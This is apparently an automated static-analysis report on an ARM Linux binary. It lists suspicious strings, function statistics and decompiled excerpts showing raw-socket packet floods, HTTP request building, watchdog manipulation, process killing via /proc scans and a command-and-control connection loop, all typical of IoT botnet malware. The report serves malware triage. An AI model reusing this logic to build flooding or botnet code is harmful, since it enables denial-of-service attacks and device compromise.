=============================================================================
========	BINARY ID :b00464a992ff84e20acc707497a7455ccbc12cc8==================================================
================================================================================
================================================================================
========	STRINGS SUMMARY : =====================================================
================================================================================
TOTAL STRINGS COUNT :266
SUPSCPECTED LINES COUNT :15
SUPSCPECTED STRINGS COUNT (DISTINCT) :13
SUPSCPECTED STRINGS WEIGHT :49
SUSPECT STRING SCORE : [49 / 150] 32%
USER AGENTS STRINGS COUNT :0
STATIC IPs STRINGS COUNT :0
DYNAMIC IPs STRINGS COUNT :0
================================================================================
========	STRINGS DETAILS : =====================================================
================================================================================
================================================================================
========	SUSPECTED STRINGS : =====================================================
================================================================================
connect
getpid
socket
kill
bind
inet_addr
fork
getppid
sigprocmask
 HTTP/1.1\r\nUser-Agent: 
\r\nHost: 
http
c/net/tcp
abcdefghijklmnopqrstuvw012345678
\vëꀐۣꀀ嫣\vëꀐ臡贍ᓢ耀컢\r臫贽ᓢ茰â荐۠ꀐסꀀ죡\rëꀐãꁀߡꀀ䳣\vëꀐӡ蔀쇠\rëꀐۣꀀ䛣\vëꀐˡ贊ᓢ耀뫢\r˫跊ᓢ賀â豐۠ꀐסꀀ듡\rëꀐãꁀ
================================================================================
========	USER AGENTS STRINGS : =====================================================
================================================================================
================================================================================
========	STATIC IP ADRESSES : =====================================================
================================================================================
================================================================================
========	DYNAMIC IP MASKS : =====================================================
================================================================================
================================================================================
========	/proc FOLDER ACCESS : =====================================================
================================================================================
================================================================================
========	HISTORY TEMPERING : =====================================================
================================================================================
================================================================================
========	AUTOINSTALL COMMANDS : =====================================================
================================================================================
================================================================================
========	FUNCTIONS SUMMARY : =====================================================
================================================================================
+++TOTAL FILE LINES			: 53908
+++TOTAL FUNCTIONS 			:119
+++LINES PER FUNCTION RATIO 	: 453.008403361345
+++SUSPECTED LINES COUNT 	: 735
+++SUSPECTED LINES RATIO 	: 1.36343399866439
================================================================================
========	WHILES SUMMARY : =====================================================
================================================================================
+++TOTAL FILE LINES				: 53908
+++WHILE (TRUE) LINES			: 8709
+++WHILE (TRUE) LINES RATION		:16.1553016249907%
+++WHILE (TRUE) LOOPS COUNT		: 78
================================================================================
========	SYSTEM FILES SUMMARY : ================================================
================================================================================
    int32_t fd = open("/proc/net/tcp", oflag); // 0xf38c
    int32_t fd = open("/dev/watchdog", O_RDWR); // 0x10204
        int32_t fd2 = open("/dev/misc/watchdog", O_RDWR); // 0x10594
================================================================================
========	IP PATTERNS SUMMARY : =================================================
================================================================================
================================================================================
========	SYSTEM CALLS SUMMARY : ================================================
================================================================================
================================================================================
========	FUNCTIONS LIST : =======================================================
================================================================================
FUNCTION_NAME                                     |ARGS|LENGH   |SUSPCET_INSTRC|WHILE_INSTRC|
----------------------------------------------------------------------------------------------
function_110e8                                    |0   |2421    |118           |1853        |
----------------------------------------------------------------------------------------------
function_1019c                                    |2   |971     |69            |344         |
----------------------------------------------------------------------------------------------
function_8f24                                     |4   |2153    |65            |1713        |
----------------------------------------------------------------------------------------------
function_e9ec                                     |4   |1065    |56            |434         |
----------------------------------------------------------------------------------------------
function_f828                                     |1   |984     |45            |570         |
----------------------------------------------------------------------------------------------
function_f2bc                                     |1   |1001    |38            |524         |
----------------------------------------------------------------------------------------------
function_c480                                     |4   |664     |27            |250         |
----------------------------------------------------------------------------------------------
function_dbb4                                     |5   |496     |21            |113         |
----------------------------------------------------------------------------------------------
function_d470                                     |4   |629     |14            |230         |
----------------------------------------------------------------------------------------------
function_ae30                                     |4   |768     |14            |234         |
----------------------------------------------------------------------------------------------
function_b084                                     |1   |492     |13            |0           |
----------------------------------------------------------------------------------------------
function_de9c                                     |4   |608     |13            |155         |
----------------------------------------------------------------------------------------------
function_e528                                     |4   |530     |13            |139         |
----------------------------------------------------------------------------------------------
function_ccfc                                     |4   |645     |13            |245         |
----------------------------------------------------------------------------------------------
function_b5e8                                     |4   |598     |12            |203         |
----------------------------------------------------------------------------------------------
function_bd64                                     |4   |590     |12            |200         |
----------------------------------------------------------------------------------------------
function_1002c                                    |0   |391     |11            |0           |
----------------------------------------------------------------------------------------------
function_13748                                    |3   |550     |8             |70          |
----------------------------------------------------------------------------------------------
function_1350c                                    |0   |364     |7             |0           |
----------------------------------------------------------------------------------------------
function_10bf4                                    |1   |350     |7             |0           |
----------------------------------------------------------------------------------------------
function_ad40                                     |6   |407     |5             |13          |
----------------------------------------------------------------------------------------------
function_10e70                                    |0   |370     |5             |0           |
----------------------------------------------------------------------------------------------
__modsi3                                          |2   |812     |5             |380         |
----------------------------------------------------------------------------------------------
__udivsi3                                         |2   |707     |5             |212         |
----------------------------------------------------------------------------------------------
function_136b8                                    |3   |561     |5             |40          |
----------------------------------------------------------------------------------------------
function_13634                                    |2   |494     |5             |40          |
----------------------------------------------------------------------------------------------
__umodsi3                                         |2   |747     |5             |354         |
----------------------------------------------------------------------------------------------
function_b1d4                                     |5   |391     |4             |16          |
----------------------------------------------------------------------------------------------
function_13380                                    |2   |581     |4             |147         |
----------------------------------------------------------------------------------------------
function_1327c                                    |2   |403     |3             |24          |
----------------------------------------------------------------------------------------------
function_135a8                                    |3   |443     |3             |48          |
----------------------------------------------------------------------------------------------
function_10c50                                    |2   |398     |3             |42          |
----------------------------------------------------------------------------------------------
_sigprocmask                                      |5   |349     |2             |0           |
----------------------------------------------------------------------------------------------
_setsockopt                                       |5   |349     |2             |0           |
----------------------------------------------------------------------------------------------
function_b240                                     |4   |391     |2             |16          |
----------------------------------------------------------------------------------------------
_getsockname                                      |4   |349     |2             |0           |
----------------------------------------------------------------------------------------------
_kill                                             |2   |349     |2             |0           |
----------------------------------------------------------------------------------------------
function_13318                                    |4   |378     |2             |20          |
----------------------------------------------------------------------------------------------
function_10d78                                    |1   |394     |2             |41          |
----------------------------------------------------------------------------------------------
_closedir                                         |2   |349     |2             |0           |
----------------------------------------------------------------------------------------------
function_10e5c                                    |1   |356     |2             |0           |
----------------------------------------------------------------------------------------------
_accept                                           |4   |349     |2             |0           |
----------------------------------------------------------------------------------------------
_sendto                                           |7   |349     |2             |0           |
----------------------------------------------------------------------------------------------
_send                                             |4   |349     |2             |0           |
----------------------------------------------------------------------------------------------
function_134ac                                    |3   |377     |2             |24          |
----------------------------------------------------------------------------------------------
_getsockopt                                       |6   |349     |2             |0           |
----------------------------------------------------------------------------------------------
function_acdc                                     |5   |381     |2             |15          |
----------------------------------------------------------------------------------------------
_recvfrom                                         |8   |349     |2             |0           |
----------------------------------------------------------------------------------------------
_close                                            |1   |349     |2             |0           |
----------------------------------------------------------------------------------------------
_getpid                                           |0   |349     |2             |0           |
----------------------------------------------------------------------------------------------
_connect                                          |4   |349     |2             |0           |
----------------------------------------------------------------------------------------------
_listen                                           |2   |349     |2             |0           |
----------------------------------------------------------------------------------------------
_getppid                                          |0   |349     |2             |0           |
----------------------------------------------------------------------------------------------
_recv                                             |4   |349     |2             |0           |
----------------------------------------------------------------------------------------------
_socket                                           |3   |349     |2             |0           |
----------------------------------------------------------------------------------------------
_open                                             |3   |349     |2             |0           |
----------------------------------------------------------------------------------------------
_fork                                             |0   |349     |2             |0           |
----------------------------------------------------------------------------------------------
function_f2a8                                     |1   |356     |2             |0           |
----------------------------------------------------------------------------------------------
_inet_addr                                        |1   |349     |2             |0           |
----------------------------------------------------------------------------------------------
_raise                                            |1   |349     |1             |0           |
----------------------------------------------------------------------------------------------
function_f1f8                                     |4   |419     |1             |0           |
----------------------------------------------------------------------------------------------
function_8ee0                                     |0   |350     |1             |0           |
----------------------------------------------------------------------------------------------
function_13b58                                    |0   |350     |1             |0           |
----------------------------------------------------------------------------------------------
_sigemptyset                                      |2   |349     |1             |0           |
----------------------------------------------------------------------------------------------
_write                                            |3   |349     |1             |0           |
----------------------------------------------------------------------------------------------
_chdir                                            |1   |349     |1             |0           |
----------------------------------------------------------------------------------------------
function_132f4                                    |2   |362     |1             |0           |
----------------------------------------------------------------------------------------------
_unlink                                           |1   |349     |1             |0           |
----------------------------------------------------------------------------------------------
function_13b24                                    |1   |365     |1             |0           |
----------------------------------------------------------------------------------------------
function_12a38                                    |0   |454     |1             |0           |
----------------------------------------------------------------------------------------------
function_13254                                    |1   |362     |1             |0           |
----------------------------------------------------------------------------------------------
function_ffd8                                     |0   |357     |1             |0           |
----------------------------------------------------------------------------------------------
_atoi                                             |1   |349     |1             |0           |
----------------------------------------------------------------------------------------------
function_12980                                    |1   |389     |1             |0           |
----------------------------------------------------------------------------------------------
__aeabi_uidivmod                                  |2   |349     |1             |0           |
----------------------------------------------------------------------------------------------
function_b2b0                                     |1   |389     |1             |0           |
----------------------------------------------------------------------------------------------
function_8e7c                                     |1   |356     |1             |0           |
----------------------------------------------------------------------------------------------
__aeabi_ldiv0                                     |0   |350     |1             |0           |
----------------------------------------------------------------------------------------------
function_13b60                                    |0   |351     |1             |0           |
----------------------------------------------------------------------------------------------
function_8b6c                                     |0   |350     |1             |0           |
----------------------------------------------------------------------------------------------
function_132d0                                    |3   |361     |1             |0           |
----------------------------------------------------------------------------------------------
function_10b9c                                    |0   |355     |1             |0           |
----------------------------------------------------------------------------------------------
_select                                           |9   |349     |1             |0           |
----------------------------------------------------------------------------------------------
*                                                 |0   |349     |1             |0           |
----------------------------------------------------------------------------------------------
function_10f44                                    |3   |402     |1             |0           |
----------------------------------------------------------------------------------------------
_sigaddset                                        |3   |349     |1             |0           |
----------------------------------------------------------------------------------------------
_setsid                                           |0   |349     |1             |0           |
----------------------------------------------------------------------------------------------
_readlink                                         |4   |349     |1             |0           |
----------------------------------------------------------------------------------------------
_sleep                                            |1   |349     |1             |0           |
----------------------------------------------------------------------------------------------
_bind                                             |4   |349     |1             |0           |
----------------------------------------------------------------------------------------------
__start                                           |2   |353     |1             |0           |
----------------------------------------------------------------------------------------------
function_ffc0                                     |0   |350     |1             |0           |
----------------------------------------------------------------------------------------------
_clock                                            |0   |349     |1             |0           |
----------------------------------------------------------------------------------------------
function_8e88                                     |0   |354     |1             |0           |
----------------------------------------------------------------------------------------------
_fcntl                                            |2   |349     |1             |0           |
----------------------------------------------------------------------------------------------
function_1289c                                    |2   |360     |1             |0           |
----------------------------------------------------------------------------------------------
function_8e08                                     |0   |370     |1             |0           |
----------------------------------------------------------------------------------------------
_prctl                                            |5   |349     |1             |0           |
----------------------------------------------------------------------------------------------
function_f19c                                     |2   |388     |1             |0           |
----------------------------------------------------------------------------------------------
___uClibc_main                                    |7   |349     |1             |0           |
----------------------------------------------------------------------------------------------
_read                                             |3   |349     |1             |0           |
----------------------------------------------------------------------------------------------
_ioctl                                            |2   |349     |1             |0           |
----------------------------------------------------------------------------------------------
__data_start                                      |3   |355     |1             |0           |
----------------------------------------------------------------------------------------------
function_8b84                                     |2   |356     |1             |0           |
----------------------------------------------------------------------------------------------
function_128c8                                    |1   |389     |1             |0           |
----------------------------------------------------------------------------------------------
_time                                             |1   |349     |1             |0           |
----------------------------------------------------------------------------------------------
_malloc                                           |1   |0       |0             |0           |
----------------------------------------------------------------------------------------------
___errno_location                                 |0   |0       |0             |0           |
----------------------------------------------------------------------------------------------
_memset                                           |3   |0       |0             |0           |
----------------------------------------------------------------------------------------------
_realloc                                          |2   |0       |0             |0           |
----------------------------------------------------------------------------------------------
__dirstream                                       |2   |0       |0             |0           |
----------------------------------------------------------------------------------------------
_calloc                                           |2   |0       |0             |0           |
----------------------------------------------------------------------------------------------
_memcpy                                           |4   |0       |0             |0           |
----------------------------------------------------------------------------------------------
sig,                                              |1   |0       |0             |0           |
----------------------------------------------------------------------------------------------
_free                                             |1   |0       |0             |0           |
----------------------------------------------------------------------------------------------
_exit                                             |1   |0       |0             |0           |
----------------------------------------------------------------------------------------------
_memmove                                          |4   |0       |0             |0           |
----------------------------------------------------------------------------------------------
dirent                                            |3   |0       |0             |0           |
----------------------------------------------------------------------------------------------
_abort                                            |0   |0       |0             |0           |
----------------------------------------------------------------------------------------------
================================================================================
========	FUNCTIONS SUSPECTED INSTRUNCTIONS : ===================================
================================================================================
=================FUNCTION : function_110e8 ===================
++++++++ FUNCTION START 40137
++++++++ FUNCTION END 42558
++++++++ FUNCTION LENGTH 2421
    struct sockaddr * v142;
    int32_t result = fork(); // 0x110f4
    int32_t sock;
    while (true) {
            int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); // 0x111bc
            sock = sock_fd;
            if (sock_fd == -1) {
            fcntl(sock_fd, F_GETFL);
            fcntl(sock_fd, F_SETFL);
            if (setsockopt(sock, status, 3, &status, 4) != 0) {
                close(sock);
            while (true) {
                    while (true) {
                        while (true) {
                while (true) {
                    uint32_t v359 = recvfrom(sock, &buf, 1514, MSG_NOSIGNAL, (struct sockaddr *)addr, (int32_t *)addr); // 0x118a4
                                                                            while (true) {
                                                                                while (true) {
                                                                                    while (true) {
                                                                                            close(fd);
                                                                                    while (true) {
                                                                                        uint32_t sock18; // 0x11c34
                                                                                        if (sock18 != -1) {
                                                                                            if ((v398 >> sock18 % 32) % 2 == 0) {
                                                                                                v397 = sock18;
                                                                                                        while (true) {
                                                                                                            while (true) {
                                                                                                                int32_t sock2; // 0x11d78
                                                                                                                int32_t v408 = recv(sock2, (int32_t *)buf2, 256 - v407, MSG_NOSIGNAL); // 0x11d88
                                                                                                                        close(fd2);
                                                                                                                            while (true) {
                                                                                                                                    case 2: {
                                                                                                                                            while (true) {
                                                                                                                                                while (true) {
                                                                                                                                                                            int32_t sock3; // 0x12704
                                                                                                                                                                            send(sock3, &buf3, 3, MSG_NOSIGNAL);
                                                                                                                                                                                        send(0x4000, (int32_t *)buf4, 3, MSG_NOSIGNAL);
                                                                                                                                                                        send(0x4000, (int32_t *)(int32_t)&buf5, 9, MSG_NOSIGNAL);
                                                                                                                                                                        while (true) {
                                                                                                                                                                                case 2: {
                                                                                                                                                                                    while (true) {
                                                                                                                                                                                case 3: {
                                                                                                                                                                                        while (true) {
                                                                                                                                                                                                int32_t sock4; // 0x11f48
                                                                                                                                                                                                send(sock4, (int32_t *)buf6, (int32_t)length, MSG_NOSIGNAL);
                                                                                                                                                                                                int32_t sock5; // 0x11f60
                                                                                                                                                                                                send(sock5, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
                                                                                                                                                                                case 4: {
                                                                                                                                                                                        while (true) {
                                                                                                                                                                                                int32_t sock6; // 0x12228
                                                                                                                                                                                                send(sock6, (int32_t *)buf7, (int32_t)length2, MSG_NOSIGNAL);
                                                                                                                                                                                                int32_t sock7; // 0x12240
                                                                                                                                                                                                send(sock7, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
                                                                                                                                                                                case 5: {
                                                                                                                                                                                        while (true) {
                                                                                                                                                                                                int32_t sock8; // 0x12000
                                                                                                                                                                                                send(sock8, (int32_t *)buf8, length3, MSG_NOSIGNAL);
                                                                                                                                                                                                int32_t sock9; // 0x12014
                                                                                                                                                                                                send(sock9, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
                                                                                                                                                                                            while (true) {
                                                                                                                                                                                    while (true) {
                                                                                                                                                                                case 6: {
                                                                                                                                                                                    while (true) {
                                                                                                                                                                                        int32_t sock10; // 0x120b4
                                                                                                                                                                                        send(sock10, (int32_t *)buf9, length4, MSG_NOSIGNAL);
                                                                                                                                                                                        int32_t sock11; // 0x120c8
                                                                                                                                                                                        send(sock11, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
                                                                                                                                                                                case 7: {
                                                                                                                                                                                    while (true) {
                                                                                                                                                                                        int32_t sock12; // 0x122e0
                                                                                                                                                                                        send(sock12, (int32_t *)buf10, length4, MSG_NOSIGNAL);
                                                                                                                                                                                        int32_t sock13; // 0x122f4
                                                                                                                                                                                        send(sock13, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
                                                                                                                                                                                case 8: {
                                                                                                                                                                                    while (true) {
                                                                                                                                                                                        int32_t sock14; // 0x12394
                                                                                                                                                                                        send(sock14, (int32_t *)buf11, length3, MSG_NOSIGNAL);
                                                                                                                                                                                        int32_t sock15; // 0x123a8
                                                                                                                                                                                        send(sock15, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
                                                                                                                                                                                case 9: {
                                                                                                                                                                                    while (true) {
                                                                                                                                                                                        int32_t sock16; // 0x12448
                                                                                                                                                                                        send(sock16, (int32_t *)buf12, length3, MSG_NOSIGNAL);
                                                                                                                                                                                        int32_t sock17; // 0x1245c
                                                                                                                                                                                        send(sock17, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
                                                                                                                                                                                case 10: {
                                                                                                                                                                                        int32_t v529 = fork(); // 0x1260c
                                                                                                                                                                                                int32_t sock_fd2 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0x12768
                                                                                                                                                                                                t = sock_fd2;
                                                                                                                                                                                                if (sock_fd2 == -1) {
                                                                                                                                                                                                if (connect(t, (struct sockaddr *)&addr2, 16) == -1) {
                                                                                                                                                                                                    close(t);
                                                                                                                                                                                                send(t, &length3, 1, MSG_NOSIGNAL);
                                                                                                                                                                                                send(t, &length4, 4, MSG_NOSIGNAL);
                                                                                                                                                                                                send(t, &buf13, 2, MSG_NOSIGNAL);
                                                                                                                                                                                                send(t, (int32_t *)(v531 + 12), 1, MSG_NOSIGNAL);
                                                                                                                                                                                                send(t, (int32_t *)buf14, (int32_t)length5, MSG_NOSIGNAL);
                                                                                                                                                                                                send(t, (int32_t *)(v531 + 13), 1, MSG_NOSIGNAL);
                                                                                                                                                                                                send(t, (int32_t *)buf15, (int32_t)length6, MSG_NOSIGNAL);
                                                                                                                                                                                                close(t);
                                                                                                                                                                                        close(fd3);
                                                                                                                                                                                        close(fd4);
                                                                                                                                                while (true) {
                                                                                                                                    case 3: {
                                                                                                                                    case 4: {
                                                                                                                                    case 5: {
                                                                                                                                    case 6: {
                                                                                                                                    case 7: {
                                                                                                                                    case 8: {
                                                                                                                                    case 9: {
                                                                                                                                    case 10: {
                                                                                                                    while (true) {
                                                                                                if ((length4 | getsockopt(sock18, SO_DEBUG, 4, &length4, &length3)) == 0) {
                                                                                                close(fd5);
                                                                                    while (true) {
            sendto(sock, &message, 40, MSG_NOSIGNAL, (struct sockaddr *)&addr2, 16);
        while (true) {
    while (true) {
=================FUNCTION : function_1019c ===================
++++++++ FUNCTION START 36517
++++++++ FUNCTION END 37488
++++++++ FUNCTION LENGTH 971
    sigprocmask((int32_t)&set, NULL, NULL);
    int32_t fd = open("/dev/watchdog", O_RDWR); // 0x10204
    struct sockaddr * addr;
        int32_t fd2 = open("/dev/misc/watchdog", O_RDWR); // 0x10594
            close(fd2);
        if (fork() > fd4) {
        close(fd4);
        close(1);
        v354 = close(2);
        while (true) {
                while (true) {
                int32_t sock2;
                    while (true) {
                    v371 = sock2;
                    int32_t sock;
                    if (sock == -1) {
                        int32_t sock_fd = socket(AF_INET, SOCK_STREAM, protocol); // 0x1094c
                        int32_t fd5 = sock_fd; // r5
                        if (sock_fd != -1) {
                            fcntl(sock_fd, F_GETFL);
                            connect(sock, (struct sockaddr *)&addr, 16);
                    uint32_t v377 = sock; // 0x10800
                    int32_t v381 = sock; // 0x106ec
                    int32_t v382 = sock2; // 0x10708
                    if (sock2 < v381) {
                                send(sock, (int32_t *)&buf2, 2, MSG_NOSIGNAL);
                        if (sock2 != -1) {
                            if ((v389 >> sock2 % 32) % 2 != 0) {
                                int32_t accepted_sock_fd = accept(sock2, (struct sockaddr *)&addr2, &addr_len); // 0x10a48
                                int32_t v390 = function_10e5c(accepted_sock_fd); // 0x10a4c
                                kill(-v353, SIGKILL);
                        uint32_t sock3 = sock; // 0x10830
                            if (sock3 != -1) {
                                if ((v394 >> sock3 % 32) % 2 != 0) {
                                    int32_t v395 = recv(sock, (int32_t *)&buf2, 2, MSG_PEEK | MSG_NOSIGNAL); // 0x1088c
                                                __pseudo_cond_branch(sock != -1, (int32_t)&v393);
                                                sock = -1;
                                            recv(sock, (int32_t *)&buf2, 2, MSG_NOSIGNAL);
                                                close(sock);
                                            int32_t v407 = recv(sock, &buf3, (int32_t)v405 | 256 * v406, MSG_PEEK | MSG_NOSIGNAL); // 0x10908
                                            recv(sock, (int32_t *)&buf2, 2, MSG_NOSIGNAL);
                                            recv(sock, &buf3, 256 * (int32_t)v408 | v406, MSG_NOSIGNAL);
                            if ((v412 >> sock3 % 32) % 2 == 0) {
                                __pseudo_cond_branch(sock3 != -1, (int32_t)&v393);
                                getsockopt(sock3, SO_DEBUG, 4, &addr_len, &option_len);
                                    int32_t sock4; // 0x10a90
                                    send(sock4, &buf4, 4, MSG_NOSIGNAL);
                                    int32_t sock5; // 0x10aa0
                                    send(sock5, (int32_t *)&buf2, 1, MSG_NOSIGNAL);
                                    int32_t sock6; // 0x10abc
                                    send(sock6, &buf5, length, MSG_NOSIGNAL);
                                    close(sock);
                v371 = sock2;
        close(fd);
        if (fork() > fd4) {
        close(fd4);
        close(1);
        v354 = close(2);
        while (true) {
        if (fork() > fd4) {
        close(fd4);
        close(1);
        v354 = close(2);
        while (true) {
    if (fork() > fd4) {
    close(fd4);
    close(1);
    v354 = close(2);
    while (true) {
=================FUNCTION : function_8f24 ===================
++++++++ FUNCTION START 20999
++++++++ FUNCTION END 23152
++++++++ FUNCTION LENGTH 2153
    struct sockaddr * v172;
    int32_t v343 = function_acdc(fd, (int32_t *)t, 20, (int32_t)"GET", v342); // fp
                        while (true) {
                                    while (true) {
                                while (true) {
                                    while (true) {
                                while (true) {
                                                int32_t sock_fd = socket(AF_INET, SOCK_STREAM, protocol); // 0x93ec
                                                dest_mem = sock_fd;
                                                fd = sock_fd;
                                                if (sock_fd != -1) {
                                                    fcntl(dest_mem, F_GETFL);
                                                    int32_t sock; // 0x942c
                                                    setsockopt(sock, protocol, 8, &option_value, 4);
                                                    int32_t sock2; // 0x945c
                                                    connect(sock2, (struct sockaddr *)&addr, 16);
                                        function_1327c((char *)v415, (int32_t)" HTTP/1.1\r\nUser-Agent: ");
                                        function_1327c((char *)v417, (int32_t)"\r\nHost: ");
                                                int32_t sock3; // 0x9a28
                                                send(sock3, (int32_t *)buf, function_13254(v387), MSG_NOSIGNAL);
                                                close(fd2);
                                                        close(fd3);
    while (true) {
        uint32_t sock8; // 0x95b0
        if (sock8 != -1) {
            if ((v463 >> sock8 % 32) % 2 == 0) {
                v462 = sock8;
                        int32_t sock4; // 0x9b3c
                        int32_t v469 = recv(sock4, &buf2, 0x2800, MSG_PEEK | MSG_NOSIGNAL); // 0x9b48
                            close(fd4);
                            while (true) {
                                            while (true) {
                                                    while (true) {
                                                    while (true) {
                                        if (function_13318(t, v529, (int32_t)"http", 4) == 4) {
                                                    while (true) {
                                                if (function_13634((char *)v543, (int32_t)"POST") == 0) {
                                                    if (function_13634((char *)v543, (int32_t)"GET") == 0) {
                                                        int32_t sock5; // 0xa658
                                                        recv(sock5, &buf2, length, MSG_NOSIGNAL);
                                                if (function_135a8((char *)fd, function_13254((char *)v560), (int32_t)"url=") == -1) {
                                                    int32_t v565 = option_value + function_135a8((char *)v564, function_13254((char *)v564), (int32_t)"url="); // 0xa554
                                                    while (true) {
                                                if (function_135a8((char *)t, function_13254((char *)v572), (int32_t)"http") == 4) {
                                                            while (true) {
                                                        memcpy((int32_t *)(v345 + 1431), (int32_t *)"GET", 4);
                                                dest_mem = (int32_t)memcpy((int32_t *)v585, (int32_t *)"GET", 4);
                                if (function_13634((char *)v543, (int32_t)"POST") == 0) {
                            while (true) {
                            while (true) {
                                int32_t sock6; // 0xa194
                                int32_t v591 = recv(sock6, (int32_t *)(v355 + v590), 1024 - v590, MSG_NOSIGNAL); // 0xa1a4
                                    close(fd5);
                                        while (true) {
                                        while (true) {
                            while (true) {
                            while (true) {
                                int32_t sock7; // 0xa388
                                int32_t v633 = recv(sock7, &buf2, 0x2800, MSG_NOSIGNAL); // 0xa394
                                            close(fd6);
                                close(fd6);
                            while (true) {
                int32_t v636 = option_value2 | getsockopt(sock8, SO_DEBUG, 4, &option_value2, &option_len); // 0x9624
                close(fd7);
    while (true) {
=================FUNCTION : function_e9ec ===================
++++++++ FUNCTION START 31179
++++++++ FUNCTION END 32244
++++++++ FUNCTION LENGTH 1065
    struct sockaddr * v177;
    fd = open((char *)function_1289c(30, NULL), O_RDONLY);
    int32_t sock_fd; // 0xec6c
        close(fd);
                while (true) {
                                        result = inet_addr((char *)&cp);
                                        sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
                                        if (sock_fd == -1) {
                                            return sock_fd;
                                        if (setsockopt(sock_fd, 0, 3, &option_value, 4) == -1) {
                                            result2 = close(sock_fd);
                                            while (true) {
                                                    while (true) {
                                            while (true) {
                                            while (true) {
                                                                sendto(sock_fd, (int32_t *)fd, v359 + 47, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
                                    result = inet_addr((char *)&cp);
                                    sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
                                    if (sock_fd == -1) {
                                        return sock_fd;
                                    if (setsockopt(sock_fd, 0, 3, &option_value, 4) == -1) {
                                        result2 = close(sock_fd);
                                        while (true) {
                    case 0: {
                    case 1: {
                    case -2: {
                    case -1: {
                sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
                if (sock_fd == -1) {
                    return sock_fd;
                if (setsockopt(sock_fd, 0, 3, &option_value, 4) == -1) {
                    result2 = close(sock_fd);
                    while (true) {
                while (true) {
            case 0: {
            case 1: {
            case -2: {
            case -1: {
        sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if (sock_fd == -1) {
            return sock_fd;
        if (setsockopt(sock_fd, 0, 3, &option_value, 4) == -1) {
            result2 = close(sock_fd);
            while (true) {
        while (true) {
        case 0: {
        case 1: {
        case -2: {
        case -1: {
    sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock_fd == -1) {
        return sock_fd;
    if (setsockopt(sock_fd, 0, 3, &option_value, 4) == -1) {
        result2 = close(sock_fd);
        while (true) {
    while (true) {
=================FUNCTION : function_f828 ===================
++++++++ FUNCTION START 34423
++++++++ FUNCTION END 35407
++++++++ FUNCTION LENGTH 984
    struct sockaddr * v175;
    int32_t result = fork(); // 0xf840
    int32_t sock = 2; // bp-72
    int32_t sock_fd = socket(domain, SOCK_STREAM, protocol); // 0xf8b0
    if (sock_fd != -1) {
        bind((int32_t)&sock, (struct sockaddr *)16, 16);
        listen(sock_fd, 1);
    int32_t sock_fd2 = socket(domain, SOCK_STREAM, protocol); // 0xf900
    if (sock_fd2 != -1) {
        bind((int32_t)&sock, (struct sockaddr *)16, 16);
        listen(sock_fd2, 1);
    int32_t pid = getpid(); // 0xf988
    int32_t fd = open((char *)&path, protocol); // 0xf9d0
        close(fd);
        while (true) {
            struct __dirstream * v357 = opendir((char *)function_1289c(6, NULL)); // 0xfa58
                struct dirent * v358 = readdir((struct __dirstream *)dirp); // 0xfa70119
                    while (true) {
                        while (true) {
                                        int32_t fd2 = open((char *)&path2, O_RDONLY); // 0xfcc4
                                                close(fd2);
                                                while (true) {
                                                        while (true) {
                                                                    close(fd2);
                                                                    kill(time_val, SIGKILL);
                                                                    v365 = readdir((struct __dirstream *)dirp);
                                                                while (true) {
                                                                        while (true) {
                                                                                while (true) {
                                                                                        while (true) {
                                                close(fd2);
                                            kill(time_val, SIGKILL);
                                        int32_t pid2 = getpid(); // 0xfc5c
                                            int32_t ppid = getppid(); // 0xfc68
                                                    int32_t fd3 = open((char *)buf2, O_RDONLY); // 0xfca0
                                                        kill(time_val, SIGKILL);
                                                    close(fd4);
                                                v365 = readdir((struct __dirstream *)dirp);
                                    v365 = readdir((struct __dirstream *)dirp);
                                        struct dirent * v426 = readdir((struct __dirstream *)dirp); // 0xfaf0
                                    v365 = readdir((struct __dirstream *)dirp2);
                                v365 = readdir((struct __dirstream *)dirp2);
                            v365 = readdir((struct __dirstream *)dirp);
                        closedir((struct __dirstream *)dirp);
                closedir((struct __dirstream *)dirp);
=================FUNCTION : function_f2bc ===================
++++++++ FUNCTION START 33419
++++++++ FUNCTION END 34420
++++++++ FUNCTION LENGTH 1001
    struct sockaddr * v177;
    int32_t fd = open("/proc/net/tcp", oflag); // 0xf38c
    struct __dirstream * dirp; // 0xf564
        close(fd2);
            dirp = opendir((char *)name);
                    while (true) {
                closedir((struct __dirstream *)fd2);
    while (true) {
                while (true) {
                            while (true) {
                                while (true) {
                                                    while (true) {
                                                close(fd2);
                                                dirp = opendir((char *)name);
                                                    while (true) {
                                                        while (true) {
                                                                        struct __dirstream * dirp2 = opendir((char *)&path); // 0xf660
                                                                                while (true) {
                                                                                    while (true) {
                                                                                                    kill(function_13380((char *)v390, 10), SIGKILL);
                                                                                                    struct dirent * v407 = readdir((struct __dirstream *)dirp3); // 0xf75c
                                                                                            struct dirent * v408 = readdir((struct __dirstream *)dirp3); // 0xf670
                                                                                    closedir((struct __dirstream *)dirp3);
                                                                                    v399 = readdir((struct __dirstream *)fd2);
                                                                                closedir((struct __dirstream *)dirp4);
                                                                            closedir((struct __dirstream *)dirp3);
                                                                            v399 = readdir((struct __dirstream *)fd2);
                                                                struct dirent * v418 = readdir((struct __dirstream *)fd2); // 0xf57c
                                                        closedir((struct __dirstream *)fd2);
                                                closedir((struct __dirstream *)fd2);
                                close(fd2);
                                dirp = opendir((char *)name);
                                    while (true) {
                                closedir((struct __dirstream *)fd2);
    close(fd2);
        dirp = opendir((char *)name);
                while (true) {
            closedir((struct __dirstream *)fd2);
=================FUNCTION : function_c480 ===================
++++++++ FUNCTION START 27589
++++++++ FUNCTION END 28253
++++++++ FUNCTION LENGTH 664
    struct sockaddr * v177;
    int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); // 0xc650
    if (sock_fd == -1) {
        return sock_fd;
    if (setsockopt(sock_fd, 0, 3, &option_value, 4) == -1) {
